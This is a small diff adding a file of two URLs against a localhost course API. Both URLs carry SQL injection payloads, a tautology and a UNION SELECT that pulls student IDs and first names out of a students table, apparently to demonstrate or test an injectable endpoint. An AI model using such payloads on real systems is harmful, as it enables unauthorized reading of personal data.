@@ -1,0 +1,4 @@
+
+https://localhost:44300/api/Courses?id=1%20or%201=1
+
+https://localhost:44300/api/Courses?id=1%20union%20select%20StudentId%20as%20CourseId,%20FirstName%20as%20Title,GETDATE()%20as%20Date%20from%20students
